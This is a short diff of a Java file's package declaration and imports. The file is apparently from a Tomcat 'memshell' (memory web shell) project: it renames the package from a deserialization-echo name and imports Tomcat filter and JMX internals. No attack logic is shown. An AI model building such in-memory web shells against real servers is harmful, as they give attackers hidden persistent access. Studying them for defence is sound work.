@@ -1,4 +1,4 @@
-package com.deserialize.echo.tomcat;
+package com.memshell.tomcat;
 
 import com.sun.jmx.mbeanserver.NamedObject;
 import com.sun.jmx.mbeanserver.Repository;
@@ -7,10 +7,12 @@ import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.modeler.Registry;
 import sun.misc.BASE64Decoder;
+
 import javax.management.DynamicMBean;
 import javax.management.MBeanServer;
 import javax.management.ObjectName;
-import javax.servlet.*;
+import javax.servlet.DispatcherType;
+import javax.servlet.Filter;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
